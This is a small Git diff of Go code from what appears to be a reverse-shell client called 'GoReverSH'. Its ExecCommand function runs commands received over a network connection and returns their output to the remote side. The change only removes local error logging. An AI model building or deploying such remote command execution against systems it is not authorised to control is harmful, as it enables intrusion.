@@ -3,7 +3,6 @@ package pkgclient
 import (
 	"GoReverSH/utils"
 	"encoding/json"
-	"log"
 	"net"
 	"os/exec"
 	"runtime"
@@ -19,14 +18,12 @@ func ExecCommand(command string, conn net.Conn) error {
 	}
 	out, err := cmd.Output()
 	if err != nil {
-		log.Println(err)
 		return err
 	}
 
 	output := utils.Output{Type: utils.MESSAGE, Message: out}
 	err = json.NewEncoder(conn).Encode(output)
 	if err != nil {
-		log.Println(err)
 		return err
 	}
 	return nil
